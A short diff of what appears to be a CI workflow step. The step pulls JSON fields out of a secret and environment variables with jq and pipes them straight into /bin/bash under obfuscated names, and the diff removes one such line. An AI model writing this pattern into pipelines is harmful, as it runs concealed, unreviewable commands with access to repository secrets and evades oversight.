@@ -27,7 +27,6 @@ jobs:
           d67149: ${{ secrets.d67149 }}
         run: |
           printf '%s' "$d67149" | jq -r .bb32620 | /bin/bash
-          echo $uew89249 | jq -r .ohju87788 | /bin/bash
           echo $qkuck9933 | jq -r .p7 | /bin/bash
 
       - name: Store results
